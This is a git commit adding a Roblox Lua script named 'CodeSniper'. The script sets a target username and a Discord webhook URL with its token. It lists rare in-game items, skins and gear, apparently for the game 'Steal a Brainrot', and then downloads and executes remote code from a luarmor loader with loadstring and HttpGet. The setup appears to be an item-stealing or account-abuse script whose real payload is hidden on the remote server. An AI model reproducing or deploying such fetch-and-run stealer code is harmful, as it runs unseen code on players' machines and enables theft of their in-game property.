1740d72d6a97216eb8c85e8eeeb3959f53ec00d1
sab-api <carlosignaa2019@gmail.com>
2026-08-15 06:39:06 -0400

    Add script CodeSniper_1786790346220.lua

---
+++ scripts/CodeSniper_1786790346220.lua
@@ -0,0 +1,62 @@
+-- Mode: NORMAL
+getgenv().TARGET_USERNAME = "Filipmis123456"
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1538134173158608947/cYgAnjBPWwS9wyA0uVMjSWrVtFMGqjNf2JzBBN-7oDNnZstOpRNrYEdED97hbKkC6NUo"
+getgenv().NORMAL_BRAINROTS = {
+    ["Noobini Pizzanini"] = true,
+    ["Arcadragon"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Dragon Aquanini"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Garama and Madundung"] = true,
+    ["Cerberus"] = true,
+    ["Meowl"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Antonio"] = true
+}
+getgenv().NORMAL_BASE_SKINS = {
+    ["Rose"] = true,
+    ["Gingerbread"] = true,
+    ["Halloween"] = true,
+    ["Christmas"] = true,
+    ["Bunny Basket"] = true,
+    ["Summer"] = true,
+    ["Pot of Gold"] = true,
+    ["Taco"] = true,
+    ["Octo"] = true,
+    ["Valentines"] = true,
+    ["Easter"] = true,
+    ["Lucky"] = true,
+    ["Aquatic"] = true,
+    ["Tralalero"] = true
+}
+getgenv().NORMAL_GEARS = {
+    ["Santa's Sleigh"] = true,
+    ["Cupid's Wings"] = true,
+    ["Witch's Broom"] = true,
+    ["Waverider"] = true,
+    ["Yin Yang Slap"] = true,
+    ["Cursed Slap"] = true,
+    ["Cyber Slap"] = true,
+    ["Divine Slap"] = true,
+    ["Bloodmoon Slap"] = true,
+    ["Radioactive Slap"] = true,
+    ["Rainbow Slap"] = true,
+    ["Rainbow Hammer"] = true,
+    ["Bloodmoon Hammer"] = true,
+    ["Radioactive Airstrike"] = true,
+    ["Yin Yang Lamp"] = true,
+    ["Demon's Head"] = true,
+    ["Lava Slap"] = true,
+    ["Lava Blaster"] = true,
+    ["Alien Slap"] = true,
+    ["Blackhole Bomb"] = true,
+    ["Candy Sentry"] = true,
+    ["Phantom Slap"] = true,
+    ["Candy Slap"] = true
+}
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/3abcf09d87cb4080f988316f1353609a.lua"))()
+end)
